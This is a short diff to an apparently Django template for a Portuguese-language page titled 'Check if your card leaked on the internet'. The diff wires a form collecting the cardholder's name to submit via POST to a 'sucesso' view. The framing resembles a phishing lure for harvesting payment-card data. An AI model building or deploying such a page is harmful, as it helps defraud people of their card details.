@@ -56,7 +56,8 @@
 <body>
     <div class="container">
         <h1>Verifique se seu cartão vazou na internet</h1>
-        <form>
+        <form method="post" action="{% url 'sucesso' %}">
+            {% csrf_token %}
             <label for="nome">Nome do Titular</label>
             <input type="text" id="nome" name="nome" required>
 
